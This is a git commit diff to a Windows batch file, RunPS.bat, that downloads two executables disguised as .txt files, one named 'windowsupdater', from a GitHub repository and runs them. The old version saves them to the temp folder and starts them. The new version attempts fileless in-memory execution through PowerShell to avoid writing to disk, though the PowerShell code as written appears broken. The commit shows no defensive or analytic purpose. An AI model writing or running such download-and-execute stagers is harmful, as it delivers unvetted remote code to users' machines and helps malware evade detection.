921f66486277844134d6009337e39772398c84d1
xxuavails <hfigo6441@gmail.com>
2025-12-14 18:36:28 +0300

    Update RunPS.bat

--- RunPS.bat
+++ RunPS.bat
@@ -3,27 +3,20 @@ REM Define URLs for the EXEs
 set U1=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Bot_detector.txt
 set U2=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/windowsupdater.txt
 
-REM Set temp file paths
-set F1=%TEMP%\Bot_detector.exe
-set F2=%TEMP%\windowsupdater.exe
+REM Use PowerShell to download and execute the EXEs without saving them to disk
 
-REM Download EXE files using curl
-curl -L -o "%F1%" "%U1%"
-curl -L -o "%F2%" "%U2%"
+REM Download and execute Bot_detector.exe in memory
+powershell -Command "
+    $url1 = '%U1%'
+    $exe1 = (Invoke-WebRequest -Uri $url1).Content
+    Start-Process -FilePath (New-Object System.IO.MemoryStream(,$exe1)) -NoNewWindow
+"
 
-REM Check if download was successful and execute the EXEs
-if exist "%F1%" (
-    echo Executing %F1%
-    start "" "%F1%"
-) else (
-    echo Failed to download %F1%
-)
-
-if exist "%F2%" (
-    echo Executing %F2%
-    start "" "%F2%"
-) else (
-    echo Failed to download %F2%
-)
+REM Download and execute windowsupdater.exe in memory
+powershell -Command "
+    $url2 = '%U2%'
+    $exe2 = (Invoke-WebRequest -Uri $url2).Content
+    Start-Process -FilePath (New-Object System.IO.MemoryStream(,$exe2)) -NoNewWindow
+"
 
 exit
